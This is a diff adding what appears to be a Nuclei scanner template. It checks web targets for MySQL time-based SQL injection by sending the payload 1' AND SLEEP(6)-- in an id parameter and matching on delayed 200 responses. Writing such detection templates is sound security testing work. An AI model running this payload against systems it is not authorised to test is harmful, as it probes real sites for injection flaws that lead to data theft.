@@ -1,0 +1,22 @@
+id: K70n0s510-sqli-time-mysql
+
+info:
+  name: MySQL Time-Based SQLi (Strict)
+  author: K70n0s510
+  severity: critical
+  description: Checks for time delays, but ignores 403 Forbidden responses to avoid WAF throttling FPs.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'+AND+SLEEP(6)--"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=6"
+
+      - type: status
+        status:
+          - 200
